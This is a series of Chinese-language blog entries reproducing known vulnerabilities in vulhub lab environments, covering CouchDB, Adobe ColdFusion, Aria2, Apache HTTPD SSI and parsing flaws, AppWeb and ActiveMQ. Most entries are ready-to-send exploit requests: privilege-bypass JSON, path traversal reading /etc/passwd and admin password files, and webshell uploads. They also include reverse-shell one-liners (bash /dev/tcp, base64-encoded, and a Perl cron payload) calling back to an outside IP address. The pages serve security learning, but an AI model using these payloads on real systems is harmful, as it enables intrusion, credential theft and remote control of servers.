        <content type="html"><![CDATA[<h1 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h1><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。</p><p>影响版本：小于 1.7.0 以及 小于 2.1.1</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>访问<a href="http://your-ip:5984/_utils/" target="_blank" rel="noopener">http://your-ip:5984/_utils/</a><br>即可看到一个web页面，说明Couchdb已成功启动。但无密码，无法登陆。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610171735.png-water_print" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先，发送如下数据包：</p><pre class=" language-HTTP"><code class="language-HTTP">PUT /_users/org.couchdb.user:geekby HTTP/1.1Host: your-ip:5984Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 90{  "type": "user",  "name": "geekby",  "roles": ["_admin"],  "password": "123456"}</code></pre><p>可见，返回403错误：<code>{"error":"forbidden","reason":"Only _admin may set roles"}</code>，只有管理员才能设置Role角色：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610171752.png-water_print" alt=""></p><p>发送包含两个roles的数据包，即可绕过限制：</p><pre class=" language-HTTP"><code class="language-HTTP">PUT /_users/org.couchdb.user:geekby HTTP/1.1Host: your-ip:5984Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 108{  "type": "user",  "name": "geekby",  "roles": ["_admin"],  "roles": [],  "password": "123456"}</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610171758.png-water_print" alt=""></p><p>成功创建管理员，账户为<code>geekby</code>，密码为<code>123456</code>：<br>再次访问<code>http://your-ip:5984/_utils/</code>，输入账户密码，可以成功登录：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610171809.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Couchdb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）</title>
      <link href="/2019/01/07/adobe-coldfusion-fan-xu-lie-hua-lou-dong/"/>
      <url>/2019/01/07/adobe-coldfusion-fan-xu-lie-hua-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）"><a href="#Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）" class="headerlink" title="Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）"></a>Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）</h1><p>Adobe ColdFusion中存在java反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。以下版本受到影响：Adobe ColdFusion (2016 release) Update 3及之前的版本，ColdFusion 11 Update 11及之前的版本，ColdFusion 10 Update 22及之前的版本。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用<a href="https://github.com/codewhitesec/ColdFusionPwn" target="_blank" rel="noopener">ColdFusionPwn</a>工具来生成POC：</p><pre><code>java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'touch /tmp/success' poc.ser</code></pre><p>POC生成于poc.ser文件中，将POC作为数据包body发送给<code>http://your-ip:8500/flex2gateway/amf</code>，Content-Type为application/x-amf：</p><pre class=" language-HTTP"><code class="language-HTTP">POST /flex2gateway/amf HTTP/1.1Host: your-ip:8500Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-amfContent-Length: 2853[...poc...]</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610171507.png-water_print" alt=""></p><p>进入容器中，发现<code>/tmp/success</code>已成功创建：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610171515.png-water_print" alt=""></p><p><code>bash -i &gt;&amp; /dev/tcp/[IP address]/[port] 0&gt;&amp;1</code></p><p><code>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xLzgwODAgMD4mMQ==}|{base64,-d}|{bash,-i}</code></p><p>将POC改成反弹shell：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token punctuation">{</span>echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS45Ni4xNC40MS80NDQ0IDA+JjE<span class="token operator">=</span><span class="token punctuation">}</span><span class="token operator">|</span><span class="token punctuation">{</span>base64,-d<span class="token punctuation">}</span><span class="token operator">|</span><span class="token punctuation">{</span>bash,-i<span class="token punctuation">}</span></code></pre><p>成功反弹shell<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610171521.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Adobe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</title>
      <link href="/2019/01/07/adobe-coldfusion-wen-jian-du-qu-lou-dong/"/>
      <url>/2019/01/07/adobe-coldfusion-wen-jian-du-qu-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）"><a href="#Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）" class="headerlink" title="Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）"></a>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</h1><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言.</p><p>Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>访问<a href="http://your-ip:8500/CFIDE/administrator/enter.cfm，可以看到初始化页面，输入密码admin，开始初始化整个环境。" target="_blank" rel="noopener">http://your-ip:8500/CFIDE/administrator/enter.cfm，可以看到初始化页面，输入密码admin，开始初始化整个环境。</a><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610171341.png-water_print" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</code>，即可读取文件<code>/etc/passwd</code>：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610171355.png-water_print" alt=""></p><p>读取后台管理员密码<code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code>：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610171402.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Adobe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Aria2 任意文件写入漏洞</title>
      <link href="/2019/01/06/aria2-ren-yi-wen-jian-xie-ru-lou-dong/"/>
      <url>/2019/01/06/aria2-ren-yi-wen-jian-xie-ru-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Aria2-任意文件写入漏洞"><a href="#Aria2-任意文件写入漏洞" class="headerlink" title="Aria2 任意文件写入漏洞"></a>Aria2 任意文件写入漏洞</h1><p>Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如<br><code>http://binux.github.io/yaaw/demo/</code></p><p>打开yaaw，点击配置按钮，填入运行aria2的目标域名：<br><code>http://your-ip:6800/jsonrpc</code>:</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610171009.png-water_print" alt=""></p><p>然后点击Add，增加一个新的下载任务。在Dir的位置填写下载至的目录，File Name处填写文件名。比如，我们通过写入一个crond任务来反弹shell：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610171018.png-water_print" alt=""></p><p>这时候，arai2会将恶意文件（我指定的URL）下载到/etc/cron.d/目录下，文件名为shell。而在debian中，/etc/cron.d目录下的所有文件将被作为计划任务配置文件（类似crontab）读取，等待一分钟不到即成功反弹shell</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Aria2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache SSI 远程命令执行漏洞</title>
      <link href="/2019/01/05/apache-ssi-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/01/05/apache-ssi-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h1><p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<code>&lt;!--#exec cmd="id" --&gt;</code>语法执行任意命令。</p><h3 id="SSI"><a href="#SSI" class="headerlink" title="SSI"></a>SSI</h3><p>Apache SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。<br>默认扩展名是 .stm、.shtm 和 .shtml。</p><p>在技术上，SSI就是在静态HTML文件中，根据需求插入不同的内容。</p><p>例如一个article的频道，每一个article内页都生成一个静态的HTML，如此时，header某个位置需要修改，则需要重新生成所有article的静态HTML文件。<br>如使用了SSI，可以在HTML文件中通过注释行嵌入经常会变化的共用部分，例如登入讯息等。可以不需要重新生成所有article，服务器会根据嵌入文件自动生成网页，输出到浏览器，如要修改则只需要修改嵌入的文件即可，无需重新生成所有HTML文件，服务器包含这种方式与php的include类似。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="upload-php"><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610170758.png-water_print" alt=""></p><p>正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：</p><pre class=" language-1.shtml"><code class="language-1.shtml"><!--#exec cmd="ls" --></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610170813.png-water_print" alt=""></p><p>成功上传，然后访问shell.shtml，可见命令已成功执行：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610170823.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache HTTPD 多后缀解析漏洞</title>
      <link href="/2019/01/05/apache-httpd-duo-hou-zhui-jie-xi-lou-dong/"/>
      <url>/2019/01/05/apache-httpd-duo-hou-zhui-jie-xi-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h1><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p><pre><code>AddType text/html .htmlAddLanguage zh-CN .cn</code></pre><p>其给<code>.html</code>后缀增加了<code>media-type</code>，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p><p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p><pre><code>AddHandler application/x-httpd-php .php</code></pre><p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境运行后，访问·<a href="http://your-ip/uploadfiles/apache.php.jpeg·即可发现，phpinfo被执行了，该文件被解析为php脚本。" target="_blank" rel="noopener">http://your-ip/uploadfiles/apache.php.jpeg·即可发现，phpinfo被执行了，该文件被解析为php脚本。</a></p><p><a href="http://your-ip/index.php中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为xxx.php.jpg或xxx.php.jpeg的文件，利用Apache解析漏洞进行getshell。" target="_blank" rel="noopener">http://your-ip/index.php中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为xxx.php.jpg或xxx.php.jpeg的文件，利用Apache解析漏洞进行getshell。</a></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610170640.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
      <link href="/2019/01/04/apache-httpd-huan-xing-jie-xi-lou-dong/"/>
      <url>/2019/01/04/apache-httpd-huan-xing-jie-xi-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h1><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'php'</span><span class="token punctuation">,</span> <span class="token string">'php3'</span><span class="token punctuation">,</span> <span class="token string">'php4'</span><span class="token punctuation">,</span> <span class="token string">'php5'</span><span class="token punctuation">,</span> <span class="token string">'phtml'</span><span class="token punctuation">,</span> <span class="token string">'pht'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'bad file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'./'</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>上传一个名为1.php的文件，被拦截：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610170001.png-water_print" alt=""></p><p>在1.php后面插入一个\x0A（注意，不能是\x0D\x0A，只能是一个\x0A），不再拦截：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610170011.png-water_print" alt=""></p><p>访问刚才上传的/1.php%0a，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610170023.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> AppWeb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AppWeb认证绕过漏洞（CVE-2018-8715）</title>
      <link href="/2019/01/03/appweb-ren-zheng-rao-guo-lou-dong/"/>
      <url>/2019/01/03/appweb-ren-zheng-rao-guo-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="AppWeb认证绕过漏洞（CVE-2018-8715）"><a href="#AppWeb认证绕过漏洞（CVE-2018-8715）" class="headerlink" title="AppWeb认证绕过漏洞（CVE-2018-8715）"></a>AppWeb认证绕过漏洞（CVE-2018-8715）</h1><blockquote><p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p></blockquote><p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p><ul><li>basic 传统HTTP基础认证</li><li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li><li>form 表单认证</li></ul><p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为null（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>利用该漏洞需要知道一个已存在的用户名，当前环境下用户名为joshua。<br>构造头Authorization: Digest username=joshua，并发送如下数据包：</p><pre class=" language-HTTP"><code class="language-HTTP">GET / HTTP/1.1Host: example.comAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeAuthorization: Digest username=joshua</code></pre><p>可见，因为我们没有传入密码字段，所以服务端出现错误，直接返回了200，且包含一个session：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610165733.png-water_print" alt=""></p><p>设置这个session到浏览器，即可正常访问需要认证的页面：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610165829.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> AppWeb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</title>
      <link href="/2019/01/02/activemq-ren-yi-wen-jian-xie-ru-lou-dong/"/>
      <url>/2019/01/02/activemq-ren-yi-wen-jian-xie-ru-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h1><h2 id="背景简述"><a href="#背景简述" class="headerlink" title="背景简述"></a>背景简述</h2><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p><p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：</p><ol><li>其使用率并不高</li><li>文件操作容易出现漏洞</li></ol><p>所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</p><p>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p><p>文件写入有几种利用方法：</p><ol><li>写入webshell</li><li>写入cron或ssh key等文件</li><li>写入jar或jetty.xml等库和配置文件</li></ol><p>写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋；写入cron或ssh key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。</p><h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>写入webshell，需要写在admin或api应用中，而这俩应用都需要登录才能访问。</p><p>默认的ActiveMQ账号密码均为<code>admin</code>，首先访问<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>，查看ActiveMQ的绝对路径：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610164649.png-water_print" alt=""></p><p>然后上传webshell：</p><pre class=" language-HTTP"><code class="language-HTTP">PUT /fileserver/2.txt HTTP/1.1Host: localhost:8161Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Length: 120976webshell...</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610164915.png-water_print" alt=""></p><p>移动到web目录下的api文件夹（<code>/opt/activemq/webapps/api/s.jsp</code>）中：</p><pre class=" language-HTTP"><code class="language-HTTP">MOVE /fileserver/2.txt HTTP/1.1Destination: file:///opt/activemq/webapps/api/s.jspHost: localhost:8161Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Length: 0</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610165024.png-water_print" alt=""></p><p>访问webshell（需要登录）：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610164718.png-water_print" alt=""></p><h2 id="写入crontab，自动化弹shell"><a href="#写入crontab，自动化弹shell" class="headerlink" title="写入crontab，自动化弹shell"></a>写入crontab，自动化弹shell</h2><p>这是一个比较稳健的方法。首先上传cron配置文件（注意，换行一定要<code>\n</code>，不能是<code>\r\n</code>，否则crontab执行会失败）：</p><pre class=" language-HTTP"><code class="language-HTTP">PUT /fileserver/1.txt HTTP/1.1Host: localhost:8161Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Length: 248*/1 * * * * root /usr/bin/perl -e 'use Socket;$i="39.96.14.41";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code></pre><p>将其移动到<code>/etc/cron.d/root</code>：</p><pre class=" language-HTTP"><code class="language-HTTP">MOVE /fileserver/1.txt HTTP/1.1Destination: file:///etc/cron.d/rootHost: localhost:8161Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Length: 0</code></pre><p>如果上述两个请求都返回204了，说明写入成功。等待反弹shell：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610165108.png-water_print" alt=""></p><p>这个方法需要ActiveMQ是root运行，否则也不能写入cron文件。</p><h2 id="写入jetty-xml或jar"><a href="#写入jetty-xml或jar" class="headerlink" title="写入jetty.xml或jar"></a>写入jetty.xml或jar</h2><p>理论上我们可以覆盖jetty.xml，将admin和api的登录限制去掉，然后再写入webshell。</p><p>有的情况下，jetty.xml和jar的所有人是web容器的用户，所以相比起来，写入crontab成功率更高一点。</p><p>msfconsole 存在对应的payload</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            